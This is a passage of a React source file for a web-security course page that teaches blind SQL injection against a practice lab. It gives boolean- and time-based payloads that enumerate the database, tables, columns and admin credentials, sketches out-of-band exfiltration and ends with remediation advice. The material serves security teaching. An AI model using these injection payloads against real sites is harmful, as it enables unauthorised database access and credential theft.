                    injection. Keeping the username as admin123, we can start
                    appending to this to try and make the database confirm true
                    things, changing the state of the taken field from false to
                    true.
                  </p>
                  <p>
                    Like in previous levels, our first Topic is to establish the
                    number of columns in the users' table, which we can achieve
                    by using the UNION statement. Change the username value to
                    the following:
                  </p>
                  <code className="content__code">
                    admin123' UNION SELECT 1;-- :
                  </code>
                  <p>
                    As the web application has responded with the value taken as
                    false, we can confirm this is the incorrect value of
                    columns. Keep on adding more columns until we have a taken
                    value of true. You can confirm that the answer is three
                    columns by setting the username to the below value:{" "}
                  </p>
                  <code className="content__code">
                    admin123' UNION SELECT 1,2,3;-- :
                  </code>
                  <p>
                    Now that our number of columns has been established, we can
                    work on the enumeration of the database. Our first Topic is
                    to discover the database name. We can do this by using the
                    built-in database() method and then using the like operator
                    to try and find results that will return a true status.Try
                    the below username value and see what happens:
                  </p>
                  <code className="content__code">
                    admin123' UNION SELECT 1,2,3 where database() like '%';--
                  </code>
                  <p>
                    {" "}
                    We get a true response because, in the like operator, we
                    just have the value of %, which will match anything as it's
                    the wildcard value. If we change the wildcard operator to
                    a%, you'll see the response goes back to false, which
                    confirms that the database name does not begin with the
                    letter a. We can cycle through all the letters, numbers and
                    characters such as - and _ until we discover a match. If you
                    send the below as the username value, you'll receive a true
                    response that confirms the database name begins with the
                    letter s.
                  </p>
                  <code className="content__code">
                    admin123' UNION SELECT 1,2,3 where database() like 's%';--
                  </code>{" "}
                  <p>
                    Now you move on to the next character of the database name
                    until you find another true response, for example, 'sa%',
                    'sb%', 'sc%', etc. Keep on with this process until you
                    discover all the characters of the database name, which is
                    sqli_three.
                  </p>
                  <p>
                    We've established the database name, which we can now use to
                    enumerate table names using a similar method by utilising
                    the information_schema database. Try setting the username to
                    the following value:
                  </p>
                  <code className="content__code">
                    admin123' UNION SELECT 1,2,3 FROM information_schema.tables
                    WHERE table_schema = 'sqli_three' and table_name like
                    'a%';--
                  </code>
                  <p>
                    This query looks for results in the information_schema
                    database in the tables table where the database name matches
                    sqli_three, and the table name begins with the letter a. As
                    the above query results in a false response, we can confirm
                    that there are no tables in the sqli_three database that
                    begin with the letter a. Like previously, you'll need to
                    cycle through letters, numbers and characters until you find
                    a positive match.
                  </p>
                  <p>
                    You'll finally end up discovering a table in the sqli_three
                    database named users, which you can confirm by running the
                    following username payload:
                  </p>
                  <code className="content__code">
                    admin123' UNION SELECT 1,2,3 FROM information_schema.tables
                    WHERE table_schema = 'sqli_three' and table_name='users';--
                  </code>
                  <p>
                    Lastly, we now need to enumerate the column names in the
                    users table so we can properly search it for login
                    credentials. Again, we can use the information_schema
                    database and the information we've already gained to query
                    it for column names. Using the payload below, we search the
                    columns table where the database is equal to sqli_three, the
                    table name is users, and the column name begins with the
                    letter a.
                  </p>
                  <code className="content__code">
                    admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS
                    WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and
                    COLUMN_NAME like 'a%';
                  </code>
                  <p>
                    Again, you'll need to cycle through letters, numbers and
                    characters until you find a match. As you're looking for
                    multiple results, you'll have to add this to your payload
                    each time you find a new column name to avoid discovering
                    the same one. For example, once you've found the column
                    named id, you'll append that to your original payload (as
                    seen below).
                  </p>
                  <code className="content__code">
                    admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS
                    WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and
                    COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
                  </code>
                  <p>
                    Repeating this process three times will enable you to
                    discover the columns' id, username and password. Which now
                    you can use to query the users table for login credentials.
                    First, you'll need to discover a valid username, which you
                    can use the payload below:
                  </p>
                  <code className="content__code">
                    admin123' UNION SELECT 1,2,3 from users where username like
                    'a%
                  </code>
                  <p>
                    {" "}
                    Once you've cycled through all the characters, you will
                    confirm the existence of the username admin. Now you've got
                    the username. You can concentrate on discovering the
                    password. The payload below shows you how to find the
                    password:
                  </p>
                  <code className="content__code">
                    admin123' UNION SELECT 1,2,3 from users where
                    username='admin' and password like 'a%
                  </code>
                  <p>
                    Cycling through all the characters, you'll discover the
                    password is 3845.
                  </p>
                </dd>
                {/* Topic 7 */}
                <dt className="fadeInUp faq-header">
                  <span>Topic 7</span> Blind SQLi - Time Based
                </dt>
                <dd className="fadeInUp faq-body open-sans" id="border-left">
                  <p>
                    <h3 className="content__title">Time-Based</h3>
                  </p>
                  <p>
                    A time-based blind SQL injection is very similar to the
                    above boolean-based one in that the same requests are sent,
                    but there is no visual indicator of your queries being wrong
                    or right this time. Instead, your indicator of a correct
                    query is based on the time the query takes to complete. This
                    time delay is introduced using built-in methods such as
                    SLEEP(x) alongside the UNION statement. The SLEEP() method
                    will only ever get executed upon a successful UNION SELECT
                    statement.{" "}
                  </p>
                  <p>
                    So, for example, when trying to establish the number of
                    columns in a table, you would use the following query:
                  </p>

                  <code className="content__code">
                    admin123' UNION SELECT SLEEP(5);--
                  </code>
                  <p>
                    If there was no pause in the response time, we know that the
                    query was unsuccessful, so like on previous Topics, we add
                    another column:
                  </p>
                  <code className="content__code">
                    admin123' UNION SELECT SLEEP(5),2;--
                  </code>
                  <p>
                    This payload should have produced a 5-second delay,
                    confirming the successful execution of the UNION statement
                    and that there are two columns.
                  </p>
                  <p>
                    You can now repeat the enumeration process from the
                    Boolean-based SQL injection, adding the SLEEP() method to
                    the UNION SELECT statement.
                  </p>
                  <p>
                    If you're struggling to find the table name, the below query
                    should help you on your way:
                  </p>
                  <code className="content__code">
                    referrer=admin123' UNION SELECT SLEEP(5),2 where database()
                    like 'u%';--
                  </code>
                </dd>
                {/* Topic 8 */}
                <dt className="fadeInUp faq-header">
                  <span>Topic 8</span> Out-of-Band SQLi
                </dt>
                <dd className="fadeInUp faq-body open-sans" id="border-left">
                  <p>
                    Out-of-band SQL Injection isn't as common as it either
                    depends on specific features being enabled on the database
                    server or the web application's business logic, which makes
                    some kind of external network call based on the results from
                    an SQL query.
                  </p>
                  <p>
                    An Out-Of-Band attack is classified by having two different
                    communication channels, one to launch the attack and the
                    other to gather the results. For example, the attack channel
                    could be a web request, and the data gathering channel could
                    be monitoring HTTP/DNS requests made to a service you
                    control.
                  </p>
                  <ul>
                    <li>
                      1) An attacker makes a request to a website vulnerable to
                      SQL Injection with an injection payload.
                    </li>
                    <li>
                      2) The Website makes an SQL query to the database, which
                      also passes the hacker's payload.
                    </li>
                    <li>
                      3) The payload contains a request which forces an HTTP
                      request back to the hacker's machine containing data from
                      the database.
                    </li>
                  </ul>
                  <img
                    src={OutOfBand}
                    alt="out-of-band-img"
                    className="img-fluid w-50 mx-auto d-block "
                  />
                  <hr />
                </dd>
                {/* Topic 9 */}
                <dt className="fadeInUp faq-header">
                  <span>Topic 9</span> Remediation
                </dt>
                <dd className="fadeInUp faq-body open-sans" id="border-left">
                  <h3 className="content__title">Remediation</h3>
                  <p>
                    As impactful as SQL Injection vulnerabilities are,
                    developers do have a way to protect their web applications
                    from them by following the advice below:
                  </p>
                  <h3 className="content__title">
                    Prepared Statements (With Parameterized Queries):
                  </h3>
                  <p>
                    In a prepared query, the first thing a developer writes is
                    the SQL query, and then any user inputs are added as
                    parameters afterwards. Writing prepared statements ensures
                    the SQL code structure doesn't change and the database can
                    distinguish between the query and the data. As a benefit, it
                    also makes your code look much cleaner and easier to read.
                  </p>
                  <h3 className="content__title">Input Validation:</h3>
                  <p>
                    Input validation can go a long way to protecting what gets
                    put into an SQL query. Employing an allow list can restrict
                    input to only certain strings, or a string replacement
                    method in the programming language can filter the characters
                    you wish to allow or disallow.{" "}
                  </p>
                  <h3 className="content__title">Escaping User Input:</h3>
                  <p>
                    Allowing user input containing characters such as ' " $ \
                    can cause SQL Queries to break or, even worse, as we've
                    learnt, open them up for injection attacks. Escaping user
                    input is the method of prepending a backslash (\) to these
                    characters, which then causes them to be parsed just as a
                    regular string and not a special character.
                  </p>
                </dd>
              </dl>
            </div>
            <div className="go-to-section">
              <button
                onClick={() =>
                  handleGoToLab("/sql_Injection/sql_Injection_labs")
                }
                className="go-to"
              >
                Go To Labs
              </button>
            </div>
          </div>
        </div>
      </div>
      {/* End Course */}
      <Go2TopBtn />
      <Footer />
    </>
  );
}
